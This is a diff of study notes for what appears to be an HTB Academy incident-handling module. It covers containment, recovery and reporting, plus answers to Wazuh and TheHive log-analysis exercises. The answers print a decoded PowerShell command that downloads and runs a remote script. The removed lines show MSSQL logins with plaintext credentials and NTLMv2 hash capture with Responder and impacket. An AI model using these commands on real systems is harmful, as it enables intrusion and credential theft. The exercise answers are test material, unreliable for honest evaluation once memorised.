+![Elastic detection page titled “BPFDoor Linux backdoor deployment” (status Open, 4 alerts). Summary: On host SRVNIX05, the BPFDoor backdoor was extracted, copied, and executed by user root. Details show root unzips file “74ef6cc38f5a1a80148752b63c117e6846984debd2af806c65887195a8eecc56” into /home/ubuntu/... then a bash shell copies it to /dev/shm/kdmtmpflush, sets chmod 755, and runs it with elevated permissions; cleanup removes the original. File is identified as Linux.Trojan.BPFDoor. Justification notes all alerts tie to host SRVNIX05 and user root with a clear sequence from extraction to execution and detection. Attack Chain timeline highlights Initial Access, Execution, Persistence, and Defense Evasion. Buttons: View in AI Assistant, Investigate in Timeline.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ai-attack.png)
+
+In this discovery, AI helped by going through multiple alerts and generated a comprehensive overview of the attack, identifying key activities that occurred during the incident. AI can help in incident response as well. Some of the use cases include:
+
+* Automated Triage & Alert Prioritization
+* Incident Correlation & Timeline Reconstruction
+* Automated Response Playbooks
+* AI Assistance in Post-Incident Analysis & Learning
+
+Question: During an investigation, we discovered a malicious file with an MD5 hash value of 'b40f6b2c167239519fcfb2028ab2524a'. What do we usually call such a hash value in investigations? Answer format: Abbreviation
+
+Answer: IOC
+
+Question: In TheHive, check the alert with rule=92153 related to the VaultCli.dll module. What is the MD5 hash value mentioned in the alert?
+
+Answer: FCDE97D37B7C0CADB3BC71267BEB5405
+
+Question: True/False: As an analyst, you detected lateral movement attempts to systems owned by another department (e.g., finance). As it belongs to another department, you will not perform escalation internally.
+
+Answer: False
+
+***
+
+### Containment, Eradiaction and Recovery
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+### Containment
+
+In this stage, we take action to prevent the spread of the incident. We divide the actions into `short-term containment` and `long-term containment`. It is important that containment actions are coordinated and executed across all systems simultaneously. Otherwise, we risk notifying attackers that we are after them, in which case they might change their techniques and tools in order to persist in the environment.
+
+In short-term containment, the actions taken leave a minimal footprint on the systems on which they occur. Some of these actions can include placing a system in a separate/isolated VLAN, pulling the network cable out of the system(s), or modifying the attacker's C2 DNS name to a system under our control or to a non-existing one. The actions here contain the damage and provide time to develop a more concrete remediation strategy. Additionally, since we keep the systems unaltered (as much as possible), we have the opportunity to take forensic images and preserve evidence if this wasn't already done during the investigation (this is also known as the `backup` substage of the containment stage). If a short-term containment action requires shutting down a system, we have to ensure that this is communicated to the business and appropriate permissions are granted.
+
+In long-term containment actions, we focus on persistent actions and changes. These can include changing user passwords, applying firewall rules, inserting a host intrusion detection system, applying a system patch, and shutting down systems. While performing these activities, we should keep the business and the relevant stakeholders updated. Bear in mind that just because a system is now patched does not mean that the incident is over. Eradication, recovery, and post-incident activities are still pending.
+
+***
+
+### Eradication
+
+Once the incident is contained, eradication is necessary to eliminate both the root cause of the incident and what is left of it to ensure that the adversary is out of the systems and network. Some of the activities in this stage include removing the detected malware from systems, rebuilding some systems, and restoring others from backup. During the eradication stage, we may extend the previously performed containment activities by applying additional patches, that were not immediately required. Additional system-hardening activities are often performed during the eradication stage (not only on the impacted system but across the network in some cases).
+
+***
+
+### Recovery
+
+In the recovery stage, we bring systems back to normal operation. Of course, the business needs to verify that a system is in fact working as expected and that it contains all the necessary data. When everything is verified, these systems are brought into the production environment. All restored systems will be subject to heavy logging and monitoring after an incident, as compromised systems tend to be targets again if the adversary regains access to the environment in a short period of time. Typical suspicious events to monitor for are:
+
+* Unusual logons (e.g., user or service accounts that have never logged-in there before).
+* Unusual processes.
+* Changes to the registry in locations that are usually modified by malware.
+
+The recovery stage in some large incidents may take months, as it is often approached in phases. During the early phases, the focus is on increasing overall security to prevent future incidents through quick wins and the elimination of low-hanging fruit. The later phases focus on permanent, long-term changes to keep the organization as secure as possible.
+
+Question: True or False: Patching a system is considered a short-term containment.
+
+Answer: False
+
+Question: During recovery, IOCs are still observed intermittently. Should recovery proceed, or should the case be escalated back to the investigation phase? Answer format: Recovery/Investigation
+
+Answer: Investigation
+
+***
+
+### Post-Incident Activity Stage
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+### Reporting
+
+The final report is a crucial part of the entire process. A complete report will contain answers to questions such as:
+
+* What happened and when?
+* How did the team perform in dealing with the incident in regard to plans, playbooks, policies, and procedures?
+* Did the business provide the necessary information and respond promptly to aid in handling the incident efficiently? What can be improved?
+* What actions have been implemented to contain and eradicate the incident?
+* What preventive measures should be put in place to prevent similar incidents in the future?
+* What tools and resources are needed to detect and analyze similar incidents in the future?
+
+Such reports can eventually provide us with measurable results. For example, they can provide us with knowledge about how many incidents have been handled, how much time the team spends per incident, and the different actions that were performed during the handling process. Additionally, incident reports provide a reference for handling future events of a similar nature. In situations where legal action is to be taken, an incident report will also be used in court and as a source for identifying the costs and impact of incidents.
+
+This stage is also a great place to train new team members by showing them how the incident was handled by more experienced colleagues. The team should also evaluate whether updating plans, playbooks, policies, and procedures is necessary. During the post-incident activity stage, it is important that we reevaluate the tools, training, and readiness of the team, as well as the overall team structure, and not focus only on the documentation and process front.
+
+Question: True or False: We should train junior team members as part of these post-incident activities.
+
+Answer: True
+
+***
+
+### Analysis of Insight Nexus Breach
+
+Question: Download the Wazuh exported logs file (i.e., wazuh\_export.zip), and identify all events that indicate potential credential compromise. Check the event ID 4688 and verify the full path of the parent process name that executed a credential dumping tool. Answer format is C:\Pr........
+
+Method: Download and unzip the json file,&#x20;
+
+Command: grep -i -A 25 "mimikatz" wazuh\_export.json
+
+```
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ grep -i -A 25 "mimikatz" wazuh_export.json 
+            "newProcessName": "C:\\Users\\Administrator\\Downloads\\mimikatz.exe",
+            "parentProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "subjectDomainName": "INSIGHT",
+            "subjectLogonId": "0x457a5240",
+            "processId": "0x1718",
+            "message": "A new process has been created. (simulated)"
+          }
+        }
+      }
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.09",
+    "_id": "04dc4cd7-0a8b-482e-abc5-caec2af6d11e",
+    "_source": {
+      "agent": {
+        "ip": "172.16.200.50",
+        "name": "SCDC01",
+        "id": "005"
+      },
+      "manager": {
+        "name": "ubuntu"
+      },
+      "location": "EventChannel",
+      "decoder": {
+        "name": "windows_eventchannel"
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ 
+
 ```
 
-**Sqlcmd - Connecting to the SQL Server**
+Answer: C:\Program Files\Mozilla Firefox\firefox.exe
 
-&#x20; Attacking SQL Databases
+Question: Identify events that show persistence mechanisms. Type the value of imagePath for a persistence mechanism that took place on the host DB01.
 
-```cmd-session
-C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
+Method: grep -E '90008' wazuh\_export.json -A 25
 
-1>
+```
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ grep -E '90008' wazuh_export.json -A 25
+        "id": "90008"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "7045",
+            "systemTime": "2025-10-09T08:10:11.102140Z",
+            "providerName": "Service Control Manager"
+          },
+          "eventdata": {
+            "serviceName": "PSEXESVC",
+            "imagePath": "C:\\Windows\\PSEXESVC.exe",
+            "user": "SYSTEM",
+            "message": "A service was installed to start from Windows root path"
+          }
+        }
+      }
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.09",
+    "_id": "d49024e9-9311-48dd-82b4-8453d3ca7f7e",
+    "_source": {
+      "agent": {
+        "ip": "201.10.112.150",
+        "name": "DEV-021",
+
 ```
 
-Note: When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
+Answer: C:\Windows\PSEXESVC.exe
 
-If we are targetting `MSSQL` from Linux, we can use `sqsh` as an alternative to `sqlcmd`:
+Question: Identify exfiltration activity — file(s) uploaded or outbound traffic. What is the external IP address to which the file diagnostics\_data.zip was uploaded?
 
-```shell-session
-0xgrooted@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
+Method: grep -E '90004' wazuh\_export.json -A 25
 
-sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
-Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
-This is free software with ABSOLUTELY NO WARRANTY
-For more information type '\warranty'
-1>
+```
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ grep -E '90004' wazuh_export.json -A 25
+        "id": "90004"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "3",
+            "systemTime": "2025-10-09T08:08:41.102140Z",
+            "providerName": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Users\\svc_deployer\\AppData\\Roaming\\updater.exe",
+            "destinationIp": "93.184.216.34",
+            "destinationPort": "443",
+            "protocol": "tcp",
+            "user": "insight\\svc_deployer",
+            "details": "HTTP POST /upload diagnostics_data.zip"
+          }
+        }
+      }
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.09",
+    "_id": "8a29f216-47f3-4c0d-8b72-ff80f6e4f008",
+    "_source": {
+      "agent": {
+
 ```
 
-Alternatively, we can use the tool from Impacket with the name `mssqlclient.py`.
+Answer: 93.184.216.34
 
-```shell-session
-0xgrooted@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 
+Question: Which user tried to connect to the file share \\\fs01\projects?
 
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+Method: grep -E '92105' wazuh\_export.json -A 25
 
-Password: MyPassword!
+```
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ grep -E '92105' wazuh_export.json -A 25
+        "id": "92105"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "3",
+            "systemTime": "2025-10-09T08:09:51.102140Z",
+            "providerName": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "eventdata": {
+            "image": "C:\\Windows\\System32\\svchost.exe",
+            "sourceIp": "172.16.200.50",
+            "destinationIp": "172.16.10.20",
+            "destinationPort": "445",
+            "user": "svc_admin",
+            "details": "SMB connect to \\\\fs01\\projects"
+          }
+        }
+      }
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.09",
+    "_id": "3ce6f9af-1df1-40f8-843d-9365dbca1a29",
+    "_source": {
+      "agent": {
 
-[*] Encryption required, switching to TLS
-[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
-[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
-[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
-[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
-[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
-[!] Press help for extra shell commands
-SQL> 
 ```
 
-Note: When we authenticate to MSSQL using `sqsh` we can use the parameters `-h` to disable headers and footers for a cleaner look.
+Answer: svc\_admin
 
-When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targeting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:
+***
 
-```shell-session
-0xgrooted@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
+### Skills Assesment
 
-sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
-Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
-This is free software with ABSOLUTELY NO WARRANTY
-For more information type '\warranty'
-1>
+#### Triage the alerts
+
+TheHive is loaded with alerts related to the Insights Nexus breach. You are requested to triage them, starting with:
+
+* Task 1: Create a new case in TheHive. Find all the alerts that are specific to the Insights Nexus breach scenario, and link the alerts in the case. This exercise introduces you to work in TheHive alerts and cases.\
+
+* Task 2: Perform triage, enrichment, and correlation in TheHive. In the notes of an alert, you can add useful information for enrichment.\
+
+* Task 3: One of the alerts related to Insights Nexus in TheHive contains some information in the notes. The netstat command output shows some connectivity to external IP addresses. You can validate this finding.
+
+![TheHive case interface showing a “Comments” panel with a pasted netstat -ano snippet from host 10.10.5.23. Entries include TCP 127.0.0.1:5357 LISTENING, TCP 10.10.5.23:139 LISTENING, outbound TCP 10.10.5.23:52344 → 198.5.x.x:443 ESTABLISHED, 10.10.5.23:52345 → 203.0.x.x:4444 ESTABLISHED, UDP 10.10.5.23:123 listening, and SMB connections to 10.10.5.17:445 and 10.10.5.18:445 (ESTABLISHED/TIME\_WAIT). Top bar shows controls (Create Case, language EN-UK, user HTB-ANALYST).](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ir-netstat.png)
+
+This output was captured after the host machine rejoined the domain following recovery. However, it is still connecting to an IP address. The analyst added this in the comments of the alert.
+
+There are some further questions asked at bottom of this section.
+
+#### Mapping to the Cyber Kill Chain
+
+A user opens an attachment, which executes a downloader that writes an .exe file to `%AppData%`, creates a `Run` registry key, and later loads `VaultCli.dll` via a suspicious tool, exfiltrating credentials to an external IP. Your task is to map each step of the attack to the kill chain phase.
+
+* Task 1: Map the file download, registry, and exfiltration activity to MITRE ATT\&CK.
+* Task 2: Check the alert related to Mimikatz in TheHive and identify the MITRE Technique ID.
+
+#### Investigate the collected logs
+
+* Task 1: Additionally, you are provided with some event log files (i.e., `logs-wazuh.zip`). One of the tasks is to decode some PowerShell commands and extract IOCs from them.
+* Task 2: Identify the user who executed the suspicious PowerShell command.
+
+Question: Open the alert "\[InsightNexus] Admin Login via ManageEngine Web Console." Find the foreign IP address starting with "203" in the comments. Check VirusTotal for the information related to this IP address, and add the details as a comment in this alert. In VirusTotal, what is the name of the file starting with "Mango" in the Files Referring section?
+
+Answer: MangoJava.exe
+
+Question: In VirusTotal, go to the details of the IP address starting with "198." What is the name of the city shown in the Whois Lookup?
+
+Answer: [Los Angeles](https://www.virustotal.com/gui/search/entity%3Aip%20whois%3A%22Los%20Angeles%22)
+
+Question: If malware downloads files from a C2 (Command and Control) server into the victim network, under what MITRE technique ID does this tool transfer technique fall? Type it as your answer. The format is T1\*\*\*.
+
+Answer: T1105
+
+Question:  Download the "logs-wazuh.zip" file from resources, and identify the suspicious PowerShell command in the logs. Type the suspicious IP address after decoding the command.
+
+Method:&#x20;
+
+```
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ grep "34012" logs-wazuh.json -A 20
+        "id": "34012",
+        "groups": [
+          "windows",
+          "sysmon",
+          "execution",
+          "obfuscation"
+        ]
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "1",
+            "systemTime": "2025-10-08T10:12:30.123Z",
+            "providerName": "Microsoft-Windows-Sysmon"
+          },
+          "eventdata": {
+            "ProcessGuid": "{e9b2a6d2-9f0c-4b3d-91a4-1f2d3e5a6b7c}",
+            "ProcessId": "5420",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==",
+            "ParentProcessId": "668",
+┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
+└──╼ [★]$ 
+
 ```
 
-**XP\_SUBDIRS Hash Stealing with Responder**
+Then use cyber chef to get the following:&#x20;
 
-```shell-session
-0xgrooted@htb[/htb]$ sudo responder -I tun0
+IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1'); Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
 
-                                         __               
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|              
-<SNIP>
+Answer: 198.51.100.24
 
-[+] Listening for events...
+Question: In the same file (i.e., logs-wazuh.zip), identify the user who executed the suspicious PowerShell command. The format is domain\user.
 
-[SMB] NTLMv2-SSP Client   : 10.10.110.17
-[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
-[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
-```
-
-**XP\_SUBDIRS Hash Stealing with impacket**
-
-```shell-session
-0xgrooted@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support
-
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
-[*] Config file parsed                                                 
-[*] Config file parsed                                                 
-[*] Config file parsed
-[*] Incoming connection (10.129.203.7,49728)
-[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
-[*] User WINSRV02\mssqlsvc authenticated successfully                        
-[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
-[*] Closing down connection (10.129.203.7,49728)                      
-[*] Remaining connections []
-```
-
-Question: What is the password for the "mssqlsvc" user?
-
-Login using the credentials given:
-
+Answer: CORP\svc-update
